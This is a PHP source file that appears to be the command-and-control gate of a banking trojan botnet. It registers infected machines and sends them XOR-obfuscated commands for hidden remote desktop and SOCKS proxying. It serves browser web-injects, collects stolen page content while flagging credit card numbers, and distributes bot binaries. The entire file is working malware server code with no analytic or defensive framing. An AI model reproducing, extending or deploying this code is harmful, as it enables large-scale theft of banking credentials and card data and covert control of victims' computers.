<?php
ob_start();
require_once('settings_data.php');
require_once('inc/const.php');
require_once('inc/db.php');
require_once('inc/geoip.php');
require_once('inc/cc.php');

function xor_obf($str, $key)
{
   $out = '';
   for($i = 0; $i < strlen($str); ++$i)
      $out .= ($str[$i] ^ $key[$i % strlen($key)]);
   return $out;
}

function get_country($ip)
{
   $gi = geoip_open('geoip.dat', GEOIP_STANDARD);
   $country = geoip_country_code_by_addr($gi, $ip);
   geoip_close($gi);
   if(strlen($country) == 0)
      return '??';
   return $country;
}

$uhid = strtoupper(key($_GET));
$key  = sha1($uhid);
$data = file_get_contents('php://input');

if(strlen($data) === 0)
{
   echo($key);
   exit();
}

$db          = db(false);
$data        = xor_obf($data, $key);
$parts       = explode('|', $data, 2);
$requestType = $parts[0];
$ip          = $_SERVER['REMOTE_ADDR'];
$ipLong      = sprintf('%u', ip2long($ip));

if($requestType == 'ping')
{
   $query = $db->prepare('SELECT last_command FROM bots WHERE uhid = ?');
   $query->bindValue(1, $uhid, PDO::PARAM_STR);
   $query->execute();
   if($query->rowCount() === 0)
   {
      echo xor_obf('0', $key);
      exit();
   }
   
   $last_command = $query->fetchColumn();
   $country     = get_country($ip);
   
   $query = $db->prepare('SELECT * FROM commands WHERE (execs <= `limit` OR `limit` = 0) AND enabled = 1 AND (id > ? OR ? = 0)');
   $query->bindValue(1, $last_command, PDO::PARAM_INT);
   $query->bindValue(2, $last_command, PDO::PARAM_INT);
   $query->execute();
   $rows = $query->fetchAll();
   $output = '';
   foreach($rows as $row)
   {
      if($row['countries'] != '')
      {
         $countries = explode(' ', $row['countries']);
         if(!in_array($country, $countries))
            continue;
      }
      if($row['uhids'] != '')
      {
         $uhids = explode(' ', $row['uhids']);
         if(!in_array($uhid, $uhids))
            continue;
      }
      $query = $db->prepare('UPDATE commands SET execs = execs + 1 WHERE id = ?');
      $query->bindValue(1, $row['id'], PDO::PARAM_INT);
      $query->execute();
      $last_command = $row['id'];
      if($row['type'] == $CONST_COMMAND_HIDDEN_DESKTOP)
         $row['param'] = $CONF_SERVER_HIDDEN_DESKTOP;
      else 
      if($row['type'] == $CONST_COMMAND_SOCKS)
         $row['param'] = $CONF_SERVER_SOCKS;
      $output .= $row['type'].'|'.$row['param']."\r\n";
   }
   $query = $db->prepare('UPDATE bots SET last_seen = ?, ip = ?, country = ?, last_command = ? WHERE uhid = ?');
   $query->bindValue(1, time(), PDO::PARAM_INT);
   $query->bindValue(2, $ipLong, PDO::PARAM_INT);
   $query->bindValue(3, $country, PDO::PARAM_STR);
   $query->bindValue(4, $last_command, PDO::PARAM_INT);
   $query->bindValue(5, $uhid, PDO::PARAM_STR);
   $query->execute();
   echo xor_obf($output, $key);
}
else if($requestType == 'info')
{
   $parts = explode('|', $parts[1]);
   $query = $db->prepare('INSERT INTO bots (uhid, os_major, os_minor, service_pack, is_server, ip,
      comp_name, user_name, is_x64, last_seen, first_seen, country, last_command) 
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 0)');
   $query->bindValue(1, $uhid, PDO::PARAM_STR);
   $query->bindValue(2, $parts[0], PDO::PARAM_INT);
   $query->bindValue(3, $parts[1], PDO::PARAM_INT);
   $query->bindValue(4, $parts[2], PDO::PARAM_INT);
   $query->bindValue(5, $parts[3], PDO::PARAM_INT);
   $query->bindValue(6, $ipLong, PDO::PARAM_INT);
   $query->bindValue(7, $parts[4], PDO::PARAM_STR);
   $query->bindValue(8, $parts[5], PDO::PARAM_STR);
   $query->bindValue(9, $parts[6], PDO::PARAM_INT);
   $time = time();
   $query->bindValue(10, $time, PDO::PARAM_INT);
   $query->bindValue(11, $time, PDO::PARAM_INT);
   $query->bindValue(12, get_country($ip));
   $query->execute();
}
else if($requestType == 'injects')
{
   $injects = file_get_contents($CONST_INJECTS_PATH);
   $injects = str_replace("%BOT_ID%", $uhid, $injects);
   $injects = str_replace("%COUNTRY%", get_country($ip), $injects);
   echo xor_obf($injects, $key);
}
else if($requestType == 'log')
{
   $parts = explode('|', $parts[1], 4);
   $query = $db->prepare('INSERT INTO reports (uhid, software, url, inject, received, content, found_card) 
      VALUES (?, ?, ?, ?, ?, ?, ?)');
   $query->bindValue(1, $uhid, PDO::PARAM_STR); //UHID|Chrome|Url|Inject|Content
   $query->bindValue(2, $parts[0], PDO::PARAM_STR);
   $query->bindValue(3, $parts[1], PDO::PARAM_STR);
   $query->bindValue(4, $parts[2], PDO::PARAM_INT);
   $query->bindValue(5, time(), PDO::PARAM_INT);
   $query->bindValue(6, $parts[3], PDO::PARAM_STR);
   $query->bindValue(7, found_card($parts[3]), PDO::PARAM_INT);
   $query->execute();
}
else if($requestType == 'bin')
{
   $path = '';
   if($parts[1] === 'int32')
      $path = $CONST_X86_BIN_PATH;
   else
      $path = $CONST_X64_BIN_PATH; 
   $content = file_get_contents($path);
   echo xor_obf($content, $key);
}
?>